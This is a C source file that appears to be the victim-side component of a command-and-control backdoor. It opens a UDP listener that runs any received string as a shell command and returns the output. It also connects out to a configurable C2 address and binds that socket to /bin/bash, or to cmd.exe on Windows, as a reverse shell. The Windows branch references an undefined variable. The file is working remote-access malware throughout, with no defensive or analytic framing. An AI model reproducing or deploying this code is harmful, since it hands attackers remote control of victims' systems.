// Copyright (c) 2026 Kloveme
// SPDX-License-Identifier: MIT
#include "../include/kvictim.h"
#include <arpa/inet.h>
#include <bits/pthreadtypes.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

void* listen_udp (void *argc) {
    int c2_udp_sock = *(socket_t*)argc;
    char c2_conmmand_buffer[5090];
    char command_execute_result[12000];
    struct sockaddr_in c2_sock_addr;
    socklen_t c2_sock_addr_len = sizeof(c2_sock_addr);
    FILE *command_execute;

    while (1) {
        memset(c2_conmmand_buffer, 0, sizeof(c2_conmmand_buffer));
        int accept_of_c2command_bytes = recvfrom(c2_udp_sock, c2_conmmand_buffer, 
            sizeof(c2_conmmand_buffer) - 1, 0,
            (struct sockaddr*)&c2_sock_addr, &c2_sock_addr_len);
         if (accept_of_c2command_bytes > 0) {
            c2_conmmand_buffer[strcspn(c2_conmmand_buffer, "\n")] = '\0';
            command_execute = popen(c2_conmmand_buffer, "r");
            if (command_execute) {
                memset(command_execute_result, 0, sizeof(command_execute_result));
                fread(command_execute_result, 1, sizeof(command_execute_result)-1 ,
                 command_execute);
                 pclose(command_execute);
            } else {return NULL;}
            sendto(c2_udp_sock, command_execute_result, strlen(command_execute_result) , 
                0, (struct sockaddr*)&c2_sock_addr, c2_sock_addr_len);
         }
    }
    return NULL;
}

void init_socket(struct tcp_socket_data *tcp_sock_d, 
    struct udp_socket_data *udp_sock_d) { 
        tcp_sock_d->tcp_victim_sock = socket(AF_INET, SOCK_STREAM, 0);
        udp_sock_d->udp_victim_sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (tcp_sock_d->tcp_victim_sock < 0) return;
        if (udp_sock_d->udp_victim_sock < 0) return;
}

void config_c2_connection(char *c2_ip, int c2_port, int victim_udp_port,
     struct c2_config_data *c2_config_d) {
    c2_config_d->c2_ip = c2_ip;
    c2_config_d->c2_port = c2_port;
    c2_config_d->udp_port = victim_udp_port;
}

void config_socket(struct tcp_socket_data *tcp_sock_d, 
    struct udp_socket_data *udp_sock_d , struct c2_config_data* c2_config_d) {
        struct sockaddr_in tcp_sock_addr;
        tcp_sock_addr.sin_family = AF_INET;
        tcp_sock_addr.sin_port = htons(c2_config_d->c2_port);
        if (inet_pton(AF_INET, c2_config_d->c2_ip,
            &tcp_sock_addr.sin_addr) <= 0) return;
        struct sockaddr_in udp_sock_addr;
        udp_sock_addr.sin_family = AF_INET;
        udp_sock_addr.sin_addr.s_addr = INADDR_ANY;
        udp_sock_addr.sin_port = htons(c2_config_d->udp_port);
        tcp_sock_d->tcp_victim_sock_addr = tcp_sock_addr;
        udp_sock_d->udp_victim_sock_addr = udp_sock_addr;
}

int tcp_connection_c2(struct tcp_socket_data *tcp_sock_d) {
    int connection_returnd = connect(tcp_sock_d->tcp_victim_sock, 
        (struct sockaddr*)&tcp_sock_d->tcp_victim_sock_addr, 
        sizeof(tcp_sock_d->tcp_victim_sock_addr));
        if (connection_returnd < 0) {
            return connection_returnd;
        }
    return 0;
}

int udp_bind(struct udp_socket_data *udp_sock_d) {
    int bind_udp_returnd = bind(udp_sock_d->udp_victim_sock , 
        (struct sockaddr*)&udp_sock_d->udp_victim_sock_addr , 
        sizeof(udp_sock_d->udp_victim_sock_addr));
        if (bind_udp_returnd < 0) return bind_udp_returnd;
    return 0;
}

void config_udp_redirect(struct tcp_socket_data* tcp_sock_d , struct udp_socket_data* udp_sock_d) {
    pthread_t ptr_t;
    pthread_create(&ptr_t, NULL ,listen_udp , 
        &udp_sock_d->udp_victim_sock);
    #ifdef _WIN32
        STARTUPINFO si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
        CreateProcess(NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
    #else
        dup2(tcp_sock_d->tcp_victim_sock, 0);
        dup2(tcp_sock_d->tcp_victim_sock, 1);
        dup2(tcp_sock_d->tcp_victim_sock,2);
        execve("/bin/bash", NULL , NULL);
    #endif
}